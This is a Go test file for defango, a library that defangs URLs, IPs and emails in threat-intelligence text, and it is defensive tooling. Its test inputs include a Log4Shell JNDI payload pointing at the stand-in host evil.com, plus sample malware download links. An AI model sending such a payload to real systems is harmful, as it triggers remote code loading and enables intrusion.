/*
defango - URL / IP / Email defanging with Golang. Make IoC harmless.

This repository is under MIT License https://github.com/edoardottt/defango/blob/main/LICENSE
*/

package defango_test

import (
	"testing"

	"github.com/edoardottt/defango"
	"github.com/stretchr/testify/require"
)

func TestText(t *testing.T) {
	tests := []struct {
		name  string
		input string
		opts  []defango.Option
		want  string
	}{
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "prose left as is",
			input: "Hello. How are you: fine? See e.g. section 3.1, v1.2.3 at 10:30:45.",
			want:  "Hello. How are you: fine? See e.g. section 3.1, v1.2.3 at 10:30:45.",
		},
		{
			name:  "URL ending a sentence",
			input: "Payload at http://evil.com/a.exe.",
			want:  "Payload at hxxp://evil[.]com/a[.]exe.",
		},
		{
			name:  "URL in parentheses",
			input: "(see https://evil.com)",
			want:  "(see hxxps://evil[.]com)",
		},
		{
			name:  "domains, IP and port",
			input: "C2: evil.com and 1.2.3.4:443. Visit evil.com.",
			want:  "C2: evil[.]com and 1[.]2[.]3[.]4[:]443. Visit evil[.]com.",
		},
		{
			name:  "domain with path",
			input: "fetch evil.com/x.ps1 now",
			want:  "fetch evil[.]com/x[.]ps1 now",
		},
		{
			name:  "email addresses",
			input: "write to admin@evil.com or mailto:first.last@evil.co.uk",
			want:  "write to admin@evil[.]com or mailto[:]first[.]last@evil[.]co[.]uk",
		},
		{
			name:  "Ipv6",
			input: "from 2001:db8::1 and [2001:db8::2]:8080",
			want:  "from 2001[:]db8[::]1 and [2001[:]db8[::]2][:]8080",
		},
		{
			name:  "colons that are not Ipv6",
			input: "std::vector at 12:30:45 from 00:1a:2b:3c:4d:5e",
			want:  "std::vector at 12:30:45 from 00:1a:2b:3c:4d:5e",
		},
		{
			name:  "JSON",
			input: `{"src":"10.0.0.1","url":"https://evil.com/x"}`,
			want:  `{"src":"10[.]0[.]0[.]1","url":"hxxps://evil[.]com/x"}`,
		},
		{
			name:  "key-value pairs",
			input: "domain:evil.com ip=8.8.8.8",
			want:  "domain:evil[.]com ip=8[.]8[.]8[.]8",
		},
		{
			name:  "Markdown link",
			input: "[evil.com](http://evil.com)",
			want:  "[evil[.]com](hxxp://evil[.]com)",
		},
		{
			name:  "Log4Shell payload",
			input: "${jndi:ldap://evil.com/a}",
			want:  "${jndi[:]ldap[://]evil[.]com/a}",
		},
		{
			name:  "scheme glued to a domain",
			input: "evil.com://x",
			want:  "evil[.]com[://]x",
		},
		{
			name:  "port glued to a domain",
			input: "x.co:1evil.com",
			want:  "x[.]co:1evil[.]com",
		},
		{
			name:  "domain followed by a label that is not a TLD",
			input: "evil.com.1",
			want:  "evil[.]com.1",
		},
		{
			name:  "internationalized domains",
			input: "evil.xn--p1ai and пример.рф",
			want:  "evil[.]xn--p1ai and пример[.]рф",
		},
		{
			name:  "invisible characters that browsers ignore",
			input: "evil\u00ad.com, evil.c\u200bom and 8\u2060.8.8.8",
			want:  "evil\u00ad[.]com, evil[.]c\u200bom and 8\u2060[.]8[.]8[.]8",
		},
		{
			name:  "diff line",
			input: "+http://evil.com",
			want:  "+hxxp://evil[.]com",
		},
		{
			name:  "full stops other than dots",
			input: "evil\u3002com and evil\uff0ecom",
			want:  "evil[.]com and evil[.]com",
		},
		{
			name:  "Japanese prose left as is",
			input: "これはペンです。あれは本です。",
			want:  "これはペンです。あれは本です。",
		},
		{
			name:  "already defanged",
			input: "hxxp://evil[.]com, 1[.]2[.]3[.]4 and user@evil[.]com",
			want:  "hxxp://evil[.]com, 1[.]2[.]3[.]4 and user@evil[.]com",
		},
		{
			name:  "partially defanged",
			input: "evil[.]bad.com",
			want:  "evil[.]bad[.]com",
		},
		{
			name:  "file names look like domains",
			input: "open report.pdf",
			want:  "open report[.]pdf",
		},
		{
			name:  "host only",
			input: "get http://evil.com/a.exe or evil.com/b.exe",
			opts:  []defango.Option{defango.HostOnly()},
			want:  "get hxxp://evil[.]com/a.exe or evil[.]com/b.exe",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, defango.Text(tt.input, tt.opts...))
		})
	}
}

func TestIsDefanged(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{input: "", want: true},
		{input: "Nothing to see here.", want: true},
		{input: "hxxps://evil[.]com/a.exe", want: true},
		{input: "evil[.]com and user@evil[.]com", want: true},
		{input: "ldap[://]evil[.]com", want: true},
		{input: "http://evil.com", want: false},
		{input: "hxxp://evil.com", want: false},
		{input: "http://evil[.]com", want: false},
		{input: "see evil.com", want: false},
		{input: "8.8.8.8", want: false},
		{input: "user@evil.com", want: false},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			require.Equal(t, tt.want, defango.IsDefanged(tt.input))
		})
	}
}
